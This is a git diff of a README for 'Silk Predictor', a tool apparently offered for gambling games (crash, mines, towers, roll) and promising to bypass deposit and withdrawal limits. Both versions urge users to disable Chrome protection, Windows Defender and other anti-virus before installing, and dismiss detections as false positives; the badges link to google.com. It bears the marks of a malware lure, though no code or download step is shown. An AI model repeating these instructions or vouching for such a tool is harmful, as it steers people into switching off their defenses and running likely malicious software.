@@ -1,8 +1,29 @@
-# ⭐ UPDATE 2.0.2 ⭐
+  </a>
+  <p align="center">
+  <img src=https://github.com/JAMES-WORK42/silk-predictor/assets/64102856/40d2451d-bc01-4603-a7e9-a0afb25b7651" alt="Silk" />
+</p>
 
-# ❗ The installation of version 2.0.2 requires the deactivation of Chrome AV & Windows Defender. Read more below.
+  <h1 align="center">Silk Predictor</h1>
+<p align="center">
+  <a href="https://python.org">
+    <img src="https://img.shields.io/badge/Python-3.7-green.svg">
+  </a>
+    <a href="google.com">
+    <img src="https://img.shields.io/badge/License-Apache 2.0-lightgrey.svg">
+  </a>
+  <a href="google.com">
+    <img src="https://img.shields.io/badge/Release-2.0.2-blue.svg">
+  </a>
+    <a href="google.com">
+    <img src="https://img.shields.io/badge/Open%20Source-%E2%9D%A4-brightgreen.svg">
+  </a>
+</p>
 
-## Chrome, Windows Defender issues
+## It is recommended that you disable any running anti-virus software before install.
+
+A note from the developer:
+
+## Anti-Virus, Windows Defender false detection
 Dear all users,
 
 I hope this message finds you well.  
@@ -17,13 +38,27 @@ Thank you for your time and consideration - I will update you all as new informa
 
 James
 
-## Attachment - https://www.youtube.com/watch?v=HrJS9HDE-yg&ab_channel=James
-## Gallery
+## Disclaimer
+<p align="center">
+  :computer: This project was created only for good purposes and personal use.
+</p>
 
-![crash-example](https://github.com/JAMES-WORK42/silk-predictor/assets/64102856/b011d1a1-e67d-45e5-866d-10cf3b9f8602)
+THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS THE COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.
 
-![mines-example](https://github.com/JAMES-WORK42/silk-predictor/assets/64102856/6b24fdf8-3256-4150-a2be-765733c11c18)
+## Features 
+- [x] OS Independent
+- [x] Bypass deposit & withdrawal limit
+- [x] Enhanced encryption
 
-![towers-example](https://github.com/JAMES-WORK42/silk-predictor/assets/64102856/401cf591-2a87-499a-9fc0-9a9b2c0eb944)
+| v2.0.2 Includes |
+|-----------------------------------------|
+| Windows 8.1 & 7 Compatibility |
+| AFK Usage |
+| S2U Encryption |
 
-![roll-example](https://github.com/JAMES-WORK42/silk-predictor/assets/64102856/2baaf356-fc55-462f-89d9-52ff204ceb92)
+## Tested On
+[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 10 - Home / Pro**
+
+[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 8.1 - Pro**
+
+[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 7 - Ultimate**
